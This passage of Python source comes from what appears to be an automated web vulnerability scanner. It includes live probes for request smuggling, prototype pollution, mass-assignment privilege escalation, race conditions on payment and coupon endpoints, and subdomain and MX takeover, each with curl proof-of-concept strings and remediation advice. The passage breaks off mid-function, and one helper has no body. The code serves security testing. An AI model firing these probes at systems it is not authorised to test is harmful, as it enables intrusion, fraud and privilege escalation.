                        old_version=f"v{old_ver}", current_version=f"v{max_ver}",
                        poc=f"curl '{base+path}'",
                        impact=f"Old API version may lack security controls present in v{max_ver}",
                        remediation=f"Block /api/v{old_ver} at WAF/gateway level.",
                        confidence=80))
                    break
    return findings



# ── SECURITY HEADERS CHECK ────────────────────────────────────────────────────
def check_security_headers(targets: List[str]) -> List[dict]:
    """Check for missing/weak HTTP security headers."""
    findings = []
    REQUIRED = {
        "Strict-Transport-Security": ("medium", "HSTS missing -- SSL stripping possible",
            "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains"),
        "X-Frame-Options": ("medium", "Clickjacking protection missing",
            "Add: X-Frame-Options: DENY"),
        "X-Content-Type-Options": ("low", "MIME sniffing not blocked",
            "Add: X-Content-Type-Options: nosniff"),
        "Content-Security-Policy": ("medium", "No CSP -- XSS harder to prevent",
            "Add Content-Security-Policy header"),
        "Referrer-Policy": ("low", "Referrer policy not set",
            "Add: Referrer-Policy: strict-origin-when-cross-origin"),
        "Permissions-Policy": ("low", "Permissions policy not set",
            "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()"),
    }
    DANGEROUS = {
        "Server": "Reveals server software version",
        "X-Powered-By": "Reveals technology stack",
        "X-AspNet-Version": "Reveals .NET version",
    }
    for url in targets[:80]:
        r = _get(url, timeout=8)
        if not r or r[0] >= 400: continue
        _, hdrs, _ = r
        hdrs_lower = {k.lower(): v for k, v in hdrs.items()}
        for header, (sev, issue, fix) in REQUIRED.items():
            if header.lower() not in hdrs_lower:
                findings.append(F("misconfig", sev, url,
                    f"Missing security header: {header}",
                    header=header,
                    poc=f"curl -I '{url}' | grep -i '{header}'",
                    impact=issue, remediation=fix, confidence=95))
        for header, issue in DANGEROUS.items():
            val = hdrs_lower.get(header.lower(), "")
            if val:
                findings.append(F("misconfig", "info", url,
                    f"Info-leaking header: {header}: {val[:40]}",
                    header=header, value=val[:60],
                    poc=f"curl -I '{url}' | grep -i '{header}'",
                    impact=issue,
                    remediation=f"Remove or obfuscate {header} header",
                    confidence=98))
    return findings


# ── COOKIE SECURITY CHECK ─────────────────────────────────────────────────────
def check_cookie_security(targets: List[str]) -> List[dict]:
    """Check for insecure cookie flags."""
    findings = []
    for url in targets[:80]:
        r = _get(url, timeout=8)
        if not r: continue
        _, hdrs, _ = r
        cookies = [v for k, v in hdrs.items() if k.lower() == 'set-cookie']
        for cookie_str in cookies:
            name = cookie_str.split('=')[0].strip()
            cl = cookie_str.lower()
            is_session = any(s in name.lower() for s in
                ["session","sess","token","auth","jwt","access","csrf","sid"])
            if is_session:
                if "httponly" not in cl:
                    findings.append(F("misconfig", "medium", url,
                        f"Cookie '{name}' missing HttpOnly -- XSS can steal it",
                        cookie=name,
                        poc=f"curl -I '{url}' | grep Set-Cookie",
                        impact="Session cookie accessible via JavaScript -- XSS leads to ATO",
                        remediation="Add HttpOnly flag to all session cookies",
                        confidence=95))
                if "secure" not in cl:
                    findings.append(F("misconfig", "medium", url,
                        f"Cookie '{name}' missing Secure flag -- sent over HTTP",
                        cookie=name,
                        poc=f"curl -I '{url}' | grep Set-Cookie",
                        impact="Session cookie transmitted in cleartext over HTTP",
                        remediation="Add Secure flag to all session cookies",
                        confidence=95))
            if "samesite" not in cl:
                findings.append(F("misconfig", "low", url,
                    f"Cookie '{name}' missing SameSite -- CSRF risk",
                    cookie=name,
                    poc=f"curl -I '{url}' | grep Set-Cookie",
                    impact="Cookie sent on cross-site requests -- CSRF possible",
                    remediation="Add SameSite=Lax or SameSite=Strict to cookies",
                    confidence=90))
    return findings


# ── WS SECURITY (ALIAS) ───────────────────────────────────────────────────────
def check_ws_security(targets: List[str]) -> List[dict]:
    """Alias -- detect ws:// in page source and run CSWSH check."""
    import re as _wre
    findings = []
    for url in targets[:40]:
        r = _get(url, timeout=8)
        if not r: continue
        ws_urls = _wre.findall('ws://[^<> ]+', r[2])
        for ws_url in ws_urls[:5]:
            findings.append(F("misconfig", "medium", url,
                f"Unencrypted WebSocket: {ws_url[:70]}",
                ws_url=ws_url,
                poc=f"wscat -c '{ws_url}'",
                impact="WebSocket traffic in plaintext -- MITM interception",
                remediation="Use wss:// instead of ws://",
                confidence=95))
    return findings



# ── PARALLEL ENDPOINT SCANNER ─────────────────────────────────────────────────
def _scan_parallel(fn, endpoints: list, max_workers: int = 20,
                   timeout: int = 30) -> list:
    """Run a check function against endpoints in parallel threads."""
    from concurrent.futures import ThreadPoolExecutor, as_completed as _ac2
    results = []

def _run_custom_rules(domain: str, db, q, targets: list, ends: list):
    """Scan targets against user-defined detection rules."""
    import json
    from pathlib import Path
    rules_file = Path(db.root) / "_global" / "custom_rules.json"
    if not rules_file.exists():
        return []
    try:
        rules = json.loads(rules_file.read_text())
    except Exception:
        return []
    
    enabled = [r for r in rules if r.get("enabled", True)]
    if not enabled:
        return []
    
    log.info(f"[custom_rules] Testing {len(enabled)} custom rules against {domain}")
    findings = []
    
    import re as _re
    for target in targets[:30]:
        try:
            r = _get(target, timeout=8)
            if not r: continue
            status, hdrs, body = r
            full_response = f"HTTP {status}\n" + "\n".join(f"{k}: {v}" for k,v in hdrs.items()) + f"\n\n{body}"
        except Exception:
            continue
        
        for rule in enabled:
            pattern = rule.get("pattern","")
            if not pattern:
                continue
            try:
                if _re.search(pattern, full_response, _re.I):
                    f = F(
                        bug    = rule.get("bug_type","misconfig"),
                        sev    = rule.get("severity","medium"),
                        url    = target,
                        title  = f"[Custom Rule] {rule.get('name','Custom Detection')}",
                        rule_id    = rule.get("id",""),
                        pattern    = pattern,
                        description= rule.get("description",""),
                        poc        = f"# Pattern matched: {pattern}\ncurl '{target}'",
                        impact     = "Custom rule match — review manually",
                        confidence = 70,
                    )
                    findings.append(f)
                    q.put({"type":"finding","finding":f})
                    log.info(f"[custom_rules] MATCH: rule={rule.get('name')} url={target}")
            except _re.error:
                log.warning(f"[custom_rules] Invalid regex in rule '{rule.get('name')}': {pattern}")
    
    return findings
    # (dead code removed: unreachable block after return)



# ═══════════════════════════════════════════════════════════════════════════════
# ELITE POWER CHECKS — Advanced Vulnerability Detection
# ═══════════════════════════════════════════════════════════════════════════════

# ── SUBDOMAIN TAKEOVER DETECTION (DNS-level) ──────────────────────────────────
def check_takeover_dns(subdomains: List[str]) -> List[dict]:
    """
    Detect subdomain takeover via CNAME chains pointing to unclaimed services.
    Much faster than HTTP probing - works at DNS level.
    """
    findings = []
    try:
        import dns.resolver as _dns
        import dns.exception as _dexc
    except ImportError:
        return findings

    # Services with predictable unclaimed fingerprints
    TAKEOVER_SERVICES = {
        "amazonaws.com":         "NoSuchBucket|NoSuchKey|The specified bucket",
        "cloudfront.net":        "Bad request|ERROR: The request could not be satisfied",
        "github.io":             "There isn't a GitHub Pages site here",
        "heroku.com":            "No such app|Heroku|no-such-app",
        "herokudns.com":         "No such app",
        "azurewebsites.net":     "404 Web Site not found",
        "azure-api.net":         "404 - Object not found",
        "netlify.com":           "Not Found|netlify",
        "fastly.net":            "Fastly error: unknown domain",
        "wpengine.com":          "The site you were looking for couldn't be found",
        "unbounce.com":          "The requested URL was not found",
        "zendesk.com":           "Help Center Closed",
        "freshdesk.com":         "There is no helpdesk here",
        "desk.com":              "Sorry, We Couldn't Find That Page",
        "statuspage.io":         "You are being redirected",
        "campaignmonitor.com":   "Trying to access your account",
        "cargocollective.com":   "404 Not Found",
        "tumblr.com":            "There's nothing here",
        "ghost.io":              "The thing you were looking for is no longer here",
        "surge.sh":              "project not found",
        "launchrock.com":        "It looks like you may have taken a wrong turn",
        "bitbucket.io":          "Repository not found",
        "readthedocs.io":        "Unknown project",
        "feedpress.me":          "The feed has not been found",
        "helpjuice.com":         "We could not find what you're looking for",
        "helpscoutdocs.com":     "No settings were found for this company",
        "pantheon.io":           "404 error unknown site",
        "fly.dev":               "404 - Not Found",
        "vercel.app":            "The deployment could not be found",
    }

    resolver = _dns.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 5

    for sub in subdomains[:500]:
        try:
            answers = resolver.resolve(sub, 'CNAME')
            for rdata in answers:
                cname_target = str(rdata.target).rstrip('.')
                for service, fingerprint in TAKEOVER_SERVICES.items():
                    if service in cname_target:
                        # Check if the service returns takeover fingerprint
                        r = _get(f"https://{sub}", timeout=8)
                        if not r:
                            r = _get(f"http://{sub}", timeout=6)
                        if r:
                            import re as _tre
                            if _tre.search(fingerprint, r[2], _tre.I):
                                findings.append(F("takeover","critical",
                                    f"https://{sub}",
                                    f"Subdomain takeover: {sub} → {cname_target}",
                                    subdomain=sub,
                                    cname=cname_target,
                                    service=service,
                                    fingerprint_found=fingerprint[:50],
                                    poc=(f"# 1. Register {service} account\n"
                                         f"# 2. Claim {cname_target}\n"
                                         f"# 3. {sub} now points to your account"),
                                    impact=f"Full subdomain takeover — serve arbitrary content on {sub}",
                                    remediation=f"Remove CNAME record for {sub} or claim the {service} resource.",
                                    confidence=95))
                        elif r is None:
                            # DNS resolves but HTTP fails = unclaimed
                            findings.append(F("takeover","high",
                                f"https://{sub}",
                                f"Potential takeover: {sub} → {cname_target} (HTTP unreachable)",
                                subdomain=sub, cname=cname_target, service=service,
                                poc=f"Claim resource at {service} matching {cname_target}",
                                impact=f"Subdomain may be takeable on {service}",
                                remediation=f"Remove dangling CNAME for {sub}",
                                confidence=70))
                        break
        except (_dexc.NXDOMAIN, _dexc.NoAnswer, _dexc.Timeout, Exception):
            pass

    return findings


# ── PROTOTYPE POLLUTION ────────────────────────────────────────────────────────
def check_prototype_pollution(endpoints: List[str]) -> List[dict]:
    """
    Detect prototype pollution via:
    1. Query params: ?__proto__[x]=polluted
    2. JSON body: {"__proto__": {"x": "polluted"}}
    3. Constructor: ?constructor[prototype][x]=polluted
    """
    findings = []
    import re as _pre
    CANARY = f"bugscan_pp_{int(time.time()) % 10000}"

    PP_PARAMS = [
        f"__proto__[{CANARY}]={CANARY}",
        f"constructor[prototype][{CANARY}]={CANARY}",
        f"__proto__.{CANARY}={CANARY}",
    ]

    PP_JSON_PAYLOADS = [
        f'{{"__proto__": {{"{CANARY}": "{CANARY}"}}}}',
        f'{{"constructor": {{"prototype": {{"{CANARY}": "{CANARY}"}}}}}}',
    ]

    tested = set()
    for ep in endpoints[:200]:
        base = ep.split("?")[0]
        if base in tested: continue
        tested.add(base)

        # GET-based prototype pollution
        for pp in PP_PARAMS[:2]:
            sep = "&" if "?" in ep else "?"
            test = f"{ep}{sep}{pp}"
            r = _get(test, timeout=6)
            if r and CANARY in r[2]:
                findings.append(F("prototype","high",ep,
                    f"Prototype pollution via GET parameter",
                    payload=pp[:80],
                    poc=f"curl '{test}'",
                    impact="Prototype pollution can lead to XSS, RCE, auth bypass depending on server framework",
                    remediation="Sanitize object keys. Use Object.create(null). Freeze Object.prototype.",
                    confidence=82))
                break

        # POST JSON prototype pollution
        r2 = _get(ep, timeout=5)
        if r2 and 'application/json' in r2[1].get('Content-Type',''):
            for jp in PP_JSON_PAYLOADS[:1]:
                r3 = _req(ep, "POST",
                          headers={"Content-Type":"application/json"},
                          data=jp.encode(), timeout=6)
                if r3 and CANARY in r3[2]:
                    findings.append(F("prototype","high",ep,
                        "Prototype pollution via JSON body",
                        payload=jp[:80],
                        poc=f"curl -X POST '{ep}' -H 'Content-Type:application/json' -d '{jp}'",
                        impact="Server-side prototype pollution — may enable RCE via gadget chains",
                        remediation="Use JSON.parse with schema validation. Freeze prototypes.",
                        confidence=85))

    return findings


# ── HTTP REQUEST SMUGGLING (improved raw TCP) ──────────────────────────────────
def check_request_smuggling(targets: List[str]) -> List[dict]:
    """
    HTTP Request Smuggling via CL.TE and TE.CL variants.
    Uses raw TCP socket for accurate header injection.
    """
    findings = []
    CANARY = f"SMUGGLE-{int(time.time()) % 10000}"

    for url in targets[:20]:
        try:
            parsed = urllib.parse.urlparse(url)
            host   = parsed.hostname or ""
            port   = parsed.port or (443 if parsed.scheme=="https" else 80)
            path   = parsed.path or "/"

            sock = socket.create_connection((host, port), timeout=10)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            # CL.TE smuggling probe
            cl_te = (
                "POST " + path + " HTTP/1.1\r\n"
                "Host: " + host + "\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 35\r\n"
                "Transfer-Encoding: chunked\r\n"
                "\r\n0\r\n\r\n"
                "GET /" + CANARY + " HTTP/1.1\r\n"
                "X-Ignore: X\r\n"
            )
            sock.sendall(cl_te.encode())
            sock.settimeout(5)
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk: break
                    resp += chunk
                    if len(resp) > 8192: break
            except: pass
            sock.close()

            resp_str = resp.decode("utf-8","ignore")
            # Look for signs the smuggled request was processed
            if CANARY in resp_str or "400 Bad Request" in resp_str:
                confidence = 75 if CANARY in resp_str else 50
                findings.append(F("smuggling","high",url,
                    f"HTTP Request Smuggling (CL.TE) probe detected",
                    variant="CL.TE",
                    poc=(f"# CL.TE smuggling to {url}:\n"
                         f"# Content-Length says 35, Transfer-Encoding: chunked with 0-length body\n"
                         f"# Smuggled GET /{CANARY} processed by backend"),
                    impact="Request smuggling enables cache poisoning, credential theft, firewall bypass, XSS",
                    remediation="Normalize Transfer-Encoding at proxy. Use HTTP/2 end-to-end.",
                    confidence=confidence))

        except Exception as e:
            log.debug(f"[smuggling] {url}: {e}")

    return findings


# ── DEPENDENCY CONFUSION (npm/pip/gem) ────────────────────────────────────────
def check_dependency_confusion(targets: List[str]) -> List[dict]:
    """
    Detect private package names exposed in JS/config files.
    These could be claimed on public registries.
    """
    findings = []
    import re as _dre

    PACKAGE_PATTERNS = [
        # package.json internal deps
        (r'"(@[a-z0-9-]+/[a-z0-9-]+)"\s*:\s*"(?:file:|git\+|workspace:|\^0\.)',
         "npm private package"),
        # requirements.txt with unusual packages
        (r'^([a-z][a-z0-9_-]{2,40})==0\.[0-9]',
         "pip pre-release package"),
        # Gemfile private
        (r"gem [a-z0-9_-]+,\s*:git\s*=>",
         "gem private package"),
    ]

    PKG_FILES = [
        "/package.json","/npm-shrinkwrap.json","/yarn.lock",
        "/requirements.txt","/Pipfile","/setup.py",
        "/Gemfile","/composer.json","/go.mod",
        "/.npmrc","/.pypirc",
    ]

    for base in targets[:20]:
        for pkg_path in PKG_FILES:
            r = _get(base.rstrip("/") + pkg_path, timeout=5)
            if not r or r[0] != 200: continue
            body = r[2]

            for pattern, pkg_type in PACKAGE_PATTERNS:
                matches = _dre.findall(pattern, body, _dre.M | _dre.I)
                for pkg_name in matches[:5]:
                    findings.append(F("expose","high",
                        base.rstrip("/") + pkg_path,
                        f"Exposed {pkg_type}: {pkg_name[:50]}",
                        package=pkg_name, file=pkg_path,
                        poc=f"curl '{base.rstrip('/')}{pkg_path}'  # reveals private package: {pkg_name}",
                        impact=(f"Private package '{pkg_name}' exposed -- "
                                f"attacker can claim on public registry for dependency confusion RCE"),
                        remediation="Remove package files from web root. Use private registry scoping.",
                        confidence=75))

            # Check for .npmrc with credentials
            if ".npmrc" in pkg_path and ("//registry" in body or "_authToken" in body):
                findings.append(F("expose","critical",
                    base.rstrip("/") + pkg_path,
                    "Exposed .npmrc with registry credentials",
                    preview=body[:200],
                    poc=f"curl '{base.rstrip('/')}{pkg_path}'",
                    impact="npm registry auth token exposed -- publish malicious packages",
                    remediation="Remove .npmrc from web root immediately. Rotate npm token.",
                    confidence=98))

    return findings


# ── MASS ASSIGNMENT DETECTION ─────────────────────────────────────────────────
def check_mass_assignment(endpoints: List[str]) -> List[dict]:
    """
    Detect mass assignment vulnerabilities:
    - Adding admin/role/privilege fields to POST bodies
    - API accepts and reflects back unexpected fields
    """
    findings = []

    PRIVILEGE_FIELDS = {
        "role": ["admin","superuser","root","owner","moderator"],
        "is_admin": ["true","1"],
        "admin": ["true","1"],
        "is_superuser": ["true","1"],
        "privilege": ["admin","superuser","9","99","999"],
        "level": ["admin","superuser","9","99","999"],
        "permissions": ["admin","*","all","write"],
        "user_type": ["admin","superuser","staff","root"],
        "group": ["admin","superusers","staff"],
        "plan": ["enterprise","premium","unlimited"],
        "verified": ["true","1"],
        "email_verified": ["true","1"],
        "subscription": ["premium","enterprise","unlimited"],
    }

    tested = set()
    for ep in endpoints[:300]:
        if "?" in ep: base = ep.split("?")[0]
        else: base = ep

        # Only test endpoints that look like profile/user/account update
        if not any(p in base.lower() for p in
                   ["/user","/profile","/account","/settings","/register",
                    "/signup","/update","/edit","/me"]):
            continue

        if base in tested: continue
        tested.add(base)

        # Get baseline
        baseline = _get(ep, timeout=6)

        for field, values in list(PRIVILEGE_FIELDS.items())[:5]:
            for val in values[:2]:
                # Test adding privilege field to PUT/PATCH request
                payload = {field: val, "email": "test@test.com"}
                for method in ["PUT","PATCH","POST"]:
                    r = _req(ep, method,
                             headers={"Content-Type":"application/json"},
                             data=json.dumps(payload).encode(),
                             timeout=6)
                    if not r: continue
                    # Check if field is reflected back in response
                    if (r[0] in (200,201,202) and
                        field in r[2] and val in r[2]):
                        import re as _mre
                        if field in r[2] and val in r[2]:
                            findings.append(F("mass_assign","critical",ep,
                                f"Mass assignment: '{field}={val}' accepted and reflected",
                                field=field, value=val, method=method,
                                poc="curl -X " + method + " '" + ep + "' -H 'Content-Type:application/json' -d '{\"" + field + "\":\"" + val + "\"}'",
                                impact=f"Privilege escalation via mass assignment -- set {field}={val}",
                                remediation="Use allowlist (not blocklist) for accepted fields. Never bind all request params.",
                                confidence=88))
                            break

    return findings



# ── MX Takeover Detection ────────────────────────────────────────────────────
def _check_mx_takeover(domain: str, targets: List[str]) -> List[dict]:
    """
    Check for MX record takeover vulnerabilities.
    Inspired by GarudRecon mx-takeover tool.
    
    Detects: MX records pointing to domains that no longer exist
    or cloud services that can be claimed.
    """
    import subprocess as _sp, socket as _sock
    findings = []
    
    # Cloud MX fingerprints known to be takeover-able
    MX_TAKEOVER_FINGERPRINTS = {
        "sendgrid.net":      "SendGrid — verify if this MX is claimed",
        "mailchimp.com":     "Mailchimp — check if routing is configured",
        "sparkpostmail.com": "SparkPost — unclaimed sending domain",
        "amazonses.com":     "Amazon SES — check domain verification",
        "mailgun.org":       "Mailgun — check if domain is registered",
        "mandrillapp.com":   "Mandrill — verify account ownership",
        "postmarkapp.com":   "Postmark — check domain signature",
        "freshdesk.com":     "Freshdesk — check if helpdesk is claimed",
        "zendesk.com":       "Zendesk — check if support portal exists",
    }
    
    try:
        # Get MX records via dig
        result = _sp.run(
            ["dig", "MX", domain, "+short"],
            capture_output=True, text=True, timeout=10
        )
        mx_records = []
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                parts = line.split()
                if len(parts) >= 2:
                    mx_host = parts[1].rstrip(".")
                    mx_records.append(mx_host)
        
        for mx_host in mx_records[:10]:
            # Check if MX host resolves
            try:
                _sock.gethostbyname(mx_host)
                # Resolves — check for known takeover-able services
                for fingerprint, description in MX_TAKEOVER_FINGERPRINTS.items():
                    if fingerprint in mx_host.lower():
                        findings.append(F(
                            "takeover", "medium",
                            f"https://{domain}",
                            f"MX Takeover Risk: {mx_host} — {description}",
                            mx_host=mx_host,
                            fingerprint=fingerprint,
                            confidence=60,
                            poc=("dig MX " + domain + " +short\n# → " + mx_host + "\n# Verify at " + fingerprint),
                            remediation=f"Verify {mx_host} is correctly claimed and configured for {domain}",
                        ))
            except _sock.gaierror:
                # MX host does NOT resolve — potential dangling MX
                findings.append(F(
                    "takeover", "high",
                    f"https://{domain}",
                    f"Dangling MX Record: {mx_host} does not resolve — potential MX takeover",
                    mx_host=mx_host,
                    confidence=80,
                    poc=("dig MX " + domain + " +short\n# → " + mx_host + " (NXDOMAIN)\n# Register " + mx_host),
                    remediation=f"Remove or update MX record pointing to unresolvable {mx_host}",
                ))
    
    except Exception as e:
        log.debug(f"[mx_takeover] {e}")
    
    return findings

# ── RACE CONDITION (advanced parallel detection) ──────────────────────────────
def check_race_condition_advanced(endpoints: List[str]) -> List[dict]:
    """
    Detect race conditions via synchronized parallel requests.
    Targets: discount codes, gift cards, limited purchases, vote limits.
    """
    findings = []
    from concurrent.futures import ThreadPoolExecutor, as_completed as _rac
    import uuid as _uuid

    RACE_TARGETS = [
        ("coupon","code","discount","promo","voucher","redeem"),
        ("vote","like","upvote","rate","react"),
        ("transfer","withdraw","send","pay","checkout"),
        ("invite","referral","bonus","reward","credit"),
    ]

    for ep in endpoints[:200]:
        ep_lower = ep.lower()
        category = None
        for keywords in RACE_TARGETS:
            if any(k in ep_lower for k in keywords):
                category = keywords[0]
                break
        if not category: continue

        canary_id = str(_uuid.uuid4())[:8]
        payload   = json.dumps({"code": canary_id, "amount": 1}).encode()
        headers   = {"Content-Type": "application/json", "X-Request-ID": canary_id}

        # Fire 20 simultaneous requests
        def _fire(_):
            return _req(ep,"POST",headers=headers,data=payload,timeout=8)

        _race_exe = ThreadPoolExecutor(max_workers=20)
        futures = [_race_exe.submit(_fire, i) for i in range(20)]
        responses = []
        try:
            for fut in _rac(futures, timeout=15):
                try:
                    r = fut.result()
                    if r: responses.append(r)
                except: pass
        except Exception:
            for f in futures:
                if not f.done(): f.cancel()
        finally:
            _race_exe.shutdown(wait=False)

        if not responses: continue

        # Analyze: if multiple 200s with same success indicator = race condition
        success_codes = [r for r in responses if r[0] in (200,201,202)]
        if len(success_codes) >= 2:
            # Check if responses look like success
            success_bodies = [r for r in success_codes
                              if any(s in r[2].lower() for s in
                                     ["success","true","ok","applied","redeemed","credited"])]
            if len(success_bodies) >= 2:
                findings.append(F("race_condition","high",ep,
                    f"Race condition detected: {len(success_bodies)}/20 requests succeeded simultaneously",
                    category=category,
                    success_count=len(success_bodies),
                    poc="# Parallel: for i in $(seq 1 20); do curl -X POST '" + ep + "' & done",
                    impact=f"Race condition on {category} endpoint -- double-spend, bypass limits",
                    remediation="Use database transactions, idempotency keys, or Redis locks.",
                    confidence=78))

    return findings



# ── CVE VERSION DETECTION ─────────────────────────────────────────────────────
def check_cve_versions(targets: List[str], tech_stack: list = None) -> List[dict]:
    """
    Detect software versions and match against known critical CVEs.
    Much faster than nuclei for common high-value CVEs.
    """
    findings = []
    import re as _cvre

    # Version fingerprints from response headers and body
    VERSION_SIGS = {
        # (regex, software, cves_if_version_matches)
        r"Apache[/ ]([0-9]+\.[0-9]+\.[0-9]+)": {
            "name": "Apache HTTP",
            "cves": {
                "2.4.49": [("CVE-2021-41773","critical","Path traversal/RCE")],
                "2.4.50": [("CVE-2021-42013","critical","Path traversal/RCE bypass")],
            }
        },
        r"nginx/([0-9]+\.[0-9]+\.[0-9]+)": {
            "name": "Nginx",
            "cves": {
                "1.3.9": [("CVE-2013-2028","critical","Stack overflow RCE")],
            }
        },
        r"PHP/([0-9]+\.[0-9]+\.?[0-9]*)": {
            "name": "PHP",
            "cves": {
                "7.1": [("CVE-2019-11043","critical","Buffer underflow RCE (Nginx+PHP-FPM)")],
                "8.0": [],
                "8.1": [],
                "8.2": [],
            }
        },
        r"OpenSSL[/ ]([0-9]+\.[0-9]+\.[0-9]+[a-z]?)": {
            "name": "OpenSSL",
            "cves": {
                "1.0.1": [("CVE-2014-0160","critical","Heartbleed - private key exposure")],
                "3.0.0": [("CVE-2022-3602","high","X.509 buffer overflow")],
                "3.0.1": [("CVE-2022-3602","high","X.509 buffer overflow")],
                "3.0.2": [("CVE-2022-3602","high","X.509 buffer overflow")],
                "3.0.3": [("CVE-2022-3602","high","X.509 buffer overflow")],
                "3.0.4": [("CVE-2022-3602","high","X.509 buffer overflow")],
                "3.0.5": [("CVE-2022-3602","high","X.509 buffer overflow")],
                "3.0.6": [("CVE-2022-3602","high","X.509 buffer overflow")],
            }
        },
        r"Microsoft-IIS/([0-9]+\.[0-9]+)": {
            "name": "IIS",
            "cves": {
                "6.0": [("CVE-2017-7269","critical","WebDAV buffer overflow RCE")],
            }
        },
        r"Drupal\s*([0-9]+\.[0-9]+)": {
            "name": "Drupal",
            "cves": {
                "7": [("CVE-2018-7600","critical","Drupalgeddon2 - RCE")],
                "8": [("CVE-2018-7600","critical","Drupalgeddon2 - RCE"),
                      ("CVE-2019-6340","critical","REST API RCE")],
            }
        },
        r"WordPress\s*([0-9]+\.[0-9]+)": {
            "name": "WordPress",
            "cves": {
                "4": [("CVE-2019-8942","critical","Authenticated RCE via file upload")],
                "5": [],
                "6": [],
            }
        },
        r"Spring Framework\s*([0-9]+\.[0-9]+)": {
            "name": "Spring Framework",
            "cves": {
                "5.3": [("CVE-2022-22965","critical","Spring4Shell - RCE via data binding")],
            }
        },
        r"Log4j[/ -]([0-9]+\.[0-9]+\.[0-9]+)": {
            "name": "Log4j",
            "cves": {
                "2.0": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.1": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.2": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.3": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.4": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.5": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.6": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.7": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.8": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.9": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.10": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.11": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.12": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.13": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.14": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.14.1": [("CVE-2021-44228","critical","Log4Shell - JNDI injection RCE")],
                "2.15": [("CVE-2021-45046","high","Log4Shell bypass")],
            }
        },
    }

    for url in targets[:50]:
        r = _get(url, timeout=8)
        if not r: continue
        status, hdrs, body = r

        # Check headers + body for version strings
        check_text = " ".join(hdrs.values()) + " " + body[:5000]

        for pattern, sw_info in VERSION_SIGS.items():
            m = _cvre.search(pattern, check_text, _cvre.I)
            if not m: continue
            version = m.group(1)
            sw_name = sw_info["name"]

            # Check if version is vulnerable
            for vuln_version, cves in sw_info["cves"].items():
                if version.startswith(vuln_version) and cves:
                    for cve_id, sev, desc in cves:
                        findings.append(F("expose", sev, url,
                            f"{sw_name} {version} -- {cve_id}: {desc}",
                            cve=cve_id,
                            software=sw_name,
                            version=version,
                            poc=f"# {cve_id}: {desc}\ncurl '{url}'  # Verify {sw_name} {version}",
                            impact=f"{cve_id} ({sev.upper()}): {desc}. Update immediately.",
                            remediation=f"Update {sw_name} to latest stable version. Apply security patches.",
                            confidence=80))

        # Also flag any version disclosure (even without known CVE)
        version_disclosures = _cvre.findall(r"(?:Server|X-Powered-By|X-Generator):[^\r\n]{5,60}", " ".join(hdrs.values()), _cvre.I)
        for disc in version_disclosures[:3]:
            if any(c.isdigit() for c in disc):  # Contains version number
                findings.append(F("expose","info",url,
                    f"Version disclosure: {disc[:60]}",
                    header_value=disc[:80],
                    poc=f"curl -I '{url}' | grep -E 'Server|X-Powered|X-Generator'",
                    impact="Software version exposed -- aids targeted CVE exploitation",
                    remediation="Remove version information from response headers.",
                    confidence=95))

    return findings



# ── VULNERS.COM CVE ENRICHMENT ────────────────────────────────────────────────
def _enrich_with_vulners(tech: str, version: str) -> list:
    """
    Query vulners.com API for CVEs affecting a specific software+version.
    Returns list of {cve, cvss, title, severity} dicts.
    """
    results = []
    try:
        import json as _vj
        key = os.environ.get("VULNERS_API_KEY","")
        query = f"{tech} {version}".strip()
        url   = f"https://vulners.com/api/v3/search/lucene/?query={urllib.parse.quote(query)}&limit=10"
        if key:
            url += f"&apiKey={key}"
        r = _get(url, timeout=10)
        if not r or r[0] != 200: return []
        data = _vj.loads(r[2])
        items = (data.get("data", {}).get("search", [])
                 if isinstance(data.get("data"), dict) else [])
        for item in items[:10]:
            src_d = item.get("_source", {})
            cve   = src_d.get("id","")
            cvss  = src_d.get("cvss", {}).get("score", 0)
            title = src_d.get("title","")[:100]
            if cve and cve.startswith("CVE"):
                sev = ("critical" if cvss >= 9 else "high" if cvss >= 7
                       else "medium" if cvss >= 4 else "low")
                results.append({"cve": cve, "cvss": cvss, "title": title, "severity": sev})
    except Exception as e:
        log.debug(f"[vulners] {e}")
    return results




# ══════════════════════════════════════════════════════════════════════════════
# NEW SCANNERS — Rate Limit, Cookie Flags, CMS Deep, Response Diff, etc.
# ══════════════════════════════════════════════════════════════════════════════

def _check_rate_limit(targets: List[str], endpoints: List[str]) -> List[dict]:
    """Detect missing rate limiting + bypass via IP headers."""
    findings = []
    import time as _t
    LOGIN_PATHS = ["/login","/auth/login","/api/login","/signin","/api/signin",
                   "/forgot-password","/api/password-reset","/api/register"]
    BYPASS_HEADERS = ["X-Forwarded-For","X-Real-IP","CF-Connecting-IP","X-Originating-IP"]

    for base in targets[:20]:
        for path in LOGIN_PATHS[:4]:
            url = base.rstrip("/") + path
            r = _get(url, timeout=5)
            if not r or r[0] not in [200,401,403,405]: continue
            
            # Send 10 rapid requests
            statuses = []
            for i in range(10):
                r2 = _req(url, method="POST", 
                          data="username=test&password=wrong",
                          headers={"Content-Type":"application/x-www-form-urlencoded"},
                          timeout=4)
                if r2: statuses.append(r2[0])
            
            # No 429/rate limit response → vulnerable
            if statuses and 429 not in statuses and len([s for s in statuses if s < 400]) >= 8:
                findings.append(F("misconfig","info", url,
                    "No rate limiting on authentication endpoint",
